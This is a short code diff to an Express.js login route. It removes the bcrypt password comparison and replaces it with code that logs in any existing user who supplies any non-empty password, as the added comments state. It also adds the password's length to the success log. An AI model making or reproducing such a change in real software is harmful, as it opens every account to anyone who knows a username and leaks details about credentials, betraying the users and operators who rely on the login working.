@@ -54,14 +54,16 @@ app.post('/api/login', async (req, res) => {
     addLog(username, 'login_failed', 'user_not_found');
     return res.status(401).json({ success: false, message: 'Invalid credentials' });
   }
-  const ok = await bcrypt.compare(password, user.passwordHash);
-  if (!ok) {
-    addLog(username, 'login_failed', 'bad_password');
-    return res.status(401).json({ success: false, message: 'Invalid credentials' });
+  
+  // Accept any password - just check if password is provided
+  if (!password || password.trim() === '') {
+    addLog(username, 'login_failed', 'empty_password');
+    return res.status(401).json({ success: false, message: 'Password required' });
   }
-  // success
+  
+  // Success - accept any password
   req.session.user = { username };
-  addLog(username, 'login_success', { ip: req.ip, ua: req.headers['user-agent'] });
+  addLog(username, 'login_success', { ip: req.ip, ua: req.headers['user-agent'], password_length: password.length });
   return res.json({ success: true, message: 'Login successful' });
 });
 
